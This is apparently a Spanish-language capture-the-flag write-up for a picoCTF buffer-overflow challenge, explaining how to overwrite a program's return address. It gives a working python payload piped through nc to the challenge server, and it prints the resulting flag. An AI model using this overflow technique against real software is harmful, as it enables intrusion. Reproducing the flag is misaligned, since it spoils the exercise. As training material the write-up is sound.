## Objetivo
Control the return address

Additional details will be available after launching your challenge instance.
## Solución
En este reto nos dan un comando para conectarnos al reto y obtener la flag asi que nos conectamos y vemos que nos pide:

Al parecer nos pide un string
```
Please enter your string: 
```

El reto nos da el código del programa asi que lo analizamos para ver si encontramos algo, guisándonos por el nombre suponemos que es un desbordamiento de memoria asi que investigamos como hacerlo.

Y encontramos el código o script:
```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08'+b'\n')"
```

El cual concatenamos con nc para ejecutarlo en el programa dandonos la flag:
```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08'+b'\n')" | nc saturn.picoctf.net 51908
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}%    
```

Flag:
```
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```
## Notas adicionales
## Referencias